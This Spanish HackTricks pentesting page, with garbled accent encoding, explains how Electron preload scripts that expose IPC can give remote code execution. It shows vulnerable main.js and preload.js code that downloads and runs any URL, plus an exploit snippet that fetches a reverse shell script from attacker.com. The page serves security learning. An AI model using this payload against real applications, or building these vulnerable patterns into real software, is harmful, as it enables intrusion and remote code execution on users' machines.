Si el script de precarga expone un punto final IPC desde el archivo main.js, el proceso de renderizado podrÃ¡ acceder a Ã©l y, si es vulnerable, podrÃ­a ser posible una RCE.

**Todos estos ejemplos fueron tomados de aquÃ­** [**https://www.youtube.com/watch?v=xILfQGkLXQo**](https://www.youtube.com/watch?v=xILfQGkLXQo)

# Ejemplo 1

Verifique cÃ³mo `main.js` escucha en `getUpdate` y **descargarÃ¡ y ejecutarÃ¡ cualquier URL** que se le pase.\
TambiÃ©n verifique cÃ³mo `preload.js` **expone cualquier evento IPC** desde el principal.
```javascript
// Part of code of main.js
ipcMain.on('getUpdate', (event, url) => {
	console.log('getUpdate: ' + url)
	mainWindow.webContents.downloadURL(url)
	mainWindow.download_url = url
});
  
mainWindow.webContents.session.on('will-download', (event, item, webContents) => {
	console.log('downloads path=' + app.getPath('downloads'))
	console.log('mainWindow.download_url=' + mainWindow.download_url);
	url_parts = mainWindow.download_url.split('/')
	filename = url_parts[url_parts.length-1]
	mainWindow.downloadPath = app.getPath('downloads') + '/' + filename
	console.log('downloadPath=' + mainWindow.downloadPath)
	// Set the save path, making Electron not to prompt a save dialog.
	item.setSavePath(mainWindow.downloadPath)

	item.on('updated', (event, state) => {
		if (state === 'interrupted') {
			console.log('Download is interrupted but can be resumed')
		}
		else if (state === 'progressing') {
			if (item.isPaused()) console.log('Download is paused')
			else console.log(`Received bytes: ${item.getReceivedBytes()}`)
		}
	})

	item.once('done', (event, state) => {
		if (state === 'completed') {
			console.log('Download successful, running update')
			fs.chmodSync(mainWindow.downloadPath, 0755);
			var child = require('child_process').execFile;
			child(mainWindow.downloadPath, function(err, data) {
				if (err) { console.error(err); return; }
				console.log(data.toString());
			});
      			}
		else console.log(`Download failed: ${state}`)
	})
}) 
```

```javascript
// Part of code of preload.js
window.electronSend = (event, data) => {
	ipcRenderer.send(event, data);
};
```
ExplotaciÃ³n:
```html
<script>
electronSend("getUpdate","https://attacker.com/path/to/revshell.sh");
</script>
```
# Ejemplo 2

Si el script de precarga expone directamente al renderizador una forma de llamar a shell.openExternal, es posible obtener RCE.
```javascript
// Part of preload.js code
window.electronOpenInBrowser = (url) => {
	shell.openExternal(url);
};
```
# Ejemplo 3

Si el script de precarga expone formas de comunicarse completamente con el proceso principal, un XSS podrÃ¡ enviar cualquier evento. El impacto de esto depende de lo que el proceso principal exponga en tÃ©rminos de IPC.
```javascript
window.electronListen = (event, cb) => {
	ipcRenderer.on(event, cb);
};

window.electronSend = (event, data) => {
	ipcRenderer.send(event, data);
};
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- ObtÃ©n la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme en** **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al repositorio [hacktricks](https://github.com/carlospolop/hacktricks) y al repositorio [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
